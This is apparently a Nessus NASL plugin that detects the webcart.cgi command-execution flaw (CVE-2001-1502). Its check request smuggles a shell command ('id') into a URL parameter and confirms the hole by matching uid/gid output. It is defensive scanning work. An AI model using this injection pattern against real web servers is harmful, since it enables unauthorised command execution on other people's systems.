# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# References:
# Date:  Fri, 19 Oct 2001 03:29:24 +0000
# From: root@xpteam.f2s.com
# To: bugtraq@securityfocus.com
# Subject: Webcart v.8.4

desc = "
webcart.cgi is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade your software or firewall your web server.
Risk factor : High";

if(description)
{
 script_id(11095);
 script_cve_id("CVE-2001-1502");
 script_bugtraq_id(3453);
 script_version ("$Revision: 1.13 $");
 
 name["english"] = "webcart.cgi";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Detects webcart.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

include('global_settings.inc');


if ( thorough_tests )
{
 extra_list = make_list ("/webcart", "/cgi-bin/webcart");
}
else
  extra_list = NULL;

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;id|&CODE=PHOLD",
			check_result:"uid=[0-9]+.* gid=[0-9]+.*",
			command:"id",
			description:desc
			);
